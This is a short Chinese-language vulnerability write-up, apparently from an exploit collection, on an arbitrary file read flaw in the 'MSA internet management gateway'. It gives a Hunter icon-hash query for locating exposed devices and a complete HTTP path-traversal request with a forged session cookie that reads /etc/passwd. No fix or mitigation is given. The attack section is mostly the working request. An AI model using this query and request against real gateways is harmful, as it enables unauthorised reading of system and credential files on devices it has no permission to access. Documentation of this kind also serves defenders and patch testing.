# MSA 互联网管理网关 msa 任意文件下载漏洞

# 一、漏洞简介
MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

# 二、影响版本
+ MSA 互联网管理网关

# 三、资产测绘
+ hunter`web.icon=="73043af39b293ade8de257c2370de7bd"`
+ 特征

![1700220436423-12e9551e-d966-4699-88e7-29994ba0e863.png](./img/rLV0S0GyUOO9zx0g/1700220436423-12e9551e-d966-4699-88e7-29994ba0e863-060740.png)

# 四、漏洞复现
```plain
GET /msa/../../../../etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
Cookie: msasessionid=-1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1700220466285-4e1ffc5d-51d5-48f8-a65c-55206c11be18.png](./img/rLV0S0GyUOO9zx0g/1700220466285-4e1ffc5d-51d5-48f8-a65c-55206c11be18-983178.png)



> 更新: 2024-02-29 23:57:13  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gysgn5ydeuqlba2w>